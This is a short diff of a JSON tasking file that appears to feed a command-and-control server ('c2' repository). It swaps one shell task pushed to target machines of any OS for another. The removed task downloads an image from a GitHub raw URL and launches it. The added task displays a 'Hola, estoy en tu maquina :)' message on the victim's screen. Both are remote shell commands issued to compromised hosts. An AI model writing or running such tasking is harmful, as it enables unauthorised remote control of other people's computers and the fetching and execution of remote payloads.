@@ -1,7 +1,7 @@
 {
     "tasks": [
         {
-            "id": "f0143643-b926-4f5a-8662-b0f19b4fe395",
+            "id": "f0143643-b926-4f5a-8662-b0f19b4fe310",
             "target": { "os": ["*"] },
             "valid_until": 4133894400,
 
@@ -9,7 +9,7 @@
                 {
                     "type": "shell",
                     "args": {
-                        "input": "curl --ssl-no-revoke -o image.jpg \"https://raw.githubusercontent.com/eduardo-cortes-dev/c2/main/image.jpg\" && start image.jpg"
+                        "input": "msg \"Hola, estoy en tu maquina :)\""
                     }
                 }
             ]
